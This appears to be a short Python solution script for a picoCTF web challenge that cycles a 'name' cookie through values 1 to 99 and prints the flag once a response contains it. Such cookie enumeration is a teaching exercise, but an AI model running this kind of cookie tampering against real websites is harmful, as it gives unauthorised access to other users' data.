import requests
from bs4 import BeautifulSoup as bs
url = ""

for i in range(1,100):
    cookies = {
        'name': str(i),
    }
    response = requests.get(url,cookies=cookies)
    if "picoCTF{" in response.text:
        flagResponse = response.text
        break
soup = bs(response.text, 'html.parser')
flag =  soup .find('code').text    
print(flag)